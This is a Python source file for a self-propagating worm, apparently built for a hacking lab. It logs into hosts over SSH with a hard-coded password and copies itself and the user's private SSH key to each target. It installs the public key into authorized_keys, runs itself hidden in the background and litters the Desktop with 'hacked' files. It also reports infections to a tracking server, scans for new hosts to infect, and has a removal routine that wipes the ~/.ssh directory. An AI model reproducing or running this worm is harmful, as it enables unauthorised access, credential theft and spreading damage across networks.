import subprocess
import socket
import sys, pty, select, os
import requests
import time
import _thread

PROMPT = "[worm]"
USER = "admin"
PASS = "hacklab"
PATH = "/home/admin/.local/share/applications/"
DESKTOP_PATH = "/home/admin/Desktop/"

class bcolours:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'

def _waitfor(fd, expected):
    # create a polling object
    poll = select.poll()
    # poll from the fd stream
    poll.register(fd, select.POLLIN)
    while True:
        # poll for output
        evt = poll.poll()
        # read the output
        out = os.read(fd, 1024)
        # for each expected response
        for str in expected:
            # if this response was expected
            if str.encode("utf-8") in out:
                # return the response
                return str

def ssh_auth(fd):
    waiting = True
    while waiting:
        # get the console output
        response = _waitfor(fd, ["continue","connected", "password"])
        
        # if yes/no dialogue option
        if response in ["connected", "continue"]:
            # say yes
            os.write(fd, "yes\n".encode("utf-8"))

        # else if asking for the password
        elif response == "password":
            # enter the password
            os.write(fd, (PASS + "\n").encode("utf-8"))
            # get out of the loop
            waiting = False

    _, exit_status = os.wait()
    # close the stream
    os.close(fd)

def scp_file(host, filename, path):
    pid, fd = pty.fork()
    # executed in child
    if pid == 0:
        # copy the file to the destination
        os.execvp("scp", ["scp", filename, USER+"@"+host+":"+path])

    # executed in parent
    elif pid > 0:
        # authorise the ssh session
        ssh_auth(fd)

def exec_worm(host):
    # run the worm on the target
    subprocess.run(["ssh", USER+"@"+host, "nohup", "python3", PATH + "worm.py payload", ">", "/dev/null", "2>&1", "&"])

def payload_post():
    # run in the background
    time.sleep(3)
    # inform server that this host is infected
    try:
        myjson = {'ip': '10.0.0.12', 'parent_ip': '0'}
        requests.post("http://127.0.0.1:8000/api/worms/", data = myjson)
    except:
        pass

def server_thread(conn):
    while True:
        data = conn.recv(1024)
        if not data:
            break
        # whenever data is recieved, send "infected"
        conn.sendall(b"infected")

def payload_server():
    # create an INET, STREAMing socket
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # bind the socket to a port
    serversocket.bind((socket.gethostname(), 6969))
    # become a server socket
    serversocket.listen()
    while True:
        conn, host = serversocket.accept()
        # connection recieved, start a new thread
        _thread.start_new_thread(server_thread, (conn,))

# work in progress
def payload_scanner():
    to_infect = ["10.0.0.30"]

    while True:
        for host in to_infect:
            try:
                print("checking " + host + " if already infected")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, 6969))
                s.sendall(b"hello")
                response = s.recv(1024)
                print("it is infected")
                if response:
                    try:
                        requests.post("http://10.0.0.31:9000/", data = {'status':response})
                    except:
                        pass
            except Exception as e:
                print(e)
                print("infecting")
                subprocess.run(["python3", "worm.py", "infect", host])
                time.sleep(10)
        time.sleep(10)

def payload():
    # fill the Desktop with files
    for i in range(30):
        subprocess.run(["touch",
            "{}{}1 you've.wrm".format(DESKTOP_PATH, str(i)),
            "{}{}2 been.wrm".format(DESKTOP_PATH, str(i)),
            "{}{}3 hacked.wrm".format(DESKTOP_PATH, str(i))])

    try:
        _thread.start_new_thread(payload_post, ())
        _thread.start_new_thread(payload_server, ())
    except:
        print("unable to start threads :(")

    while True:
        pass

def infect(target):
    PROMPT = "[" + target + "]"

    print(bcolours.OKBLUE + PROMPT, "Propagating to", target, bcolours.ENDC)

    # copy the worm file
    print(PROMPT, "Copying worm")
    scp_file(target, "worm.py", PATH)

    # copy the ssh private key
    print(PROMPT, "Copying private key")
    scp_file(target, "/home/admin/.ssh/id_rsa", "/home/admin/.ssh/")

    # copy the ssh public key
    print(PROMPT, "Copying public key")
    scp_file(target, "/home/admin/.ssh/id_rsa.pub", "/home/admin/.ssh/authorized_keys")

    print(bcolours.OKGREEN + PROMPT, "All files successfully transferred", bcolours.ENDC)

    # run the worm
    print(PROMPT, "Executing on", target)
    exec_worm(target)

    print(bcolours.OKGREEN + PROMPT, "Worm running on", target, bcolours.ENDC)

def remove(target):
    PROMPT = "[" + target + "]"

    # kill the worm process
    print(PROMPT, "Killing worm process")
    subprocess.run(["ssh", USER+"@"+target, "kill", "$(", "ps", "-e", "aux", "|", "grep", "[p]ayload", "|", "awk", "'{print $2}'", ")"])

    # remove all files
    print(PROMPT, "Removing all files")
    subprocess.run(["ssh", USER+"@"+target, "rm", DESKTOP_PATH+"*.wrm", PATH+"worm.py", "/home/admin/.ssh/*"])
    pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(PROMPT, "need an argument")
    elif sys.argv[1] == "payload":
        payload()
    elif sys.argv[1] == "remove" and len(sys.argv) == 3:
        remove(sys.argv[2])
    elif sys.argv[1] == "infect" and len(sys.argv) == 3:
        infect(sys.argv[2])
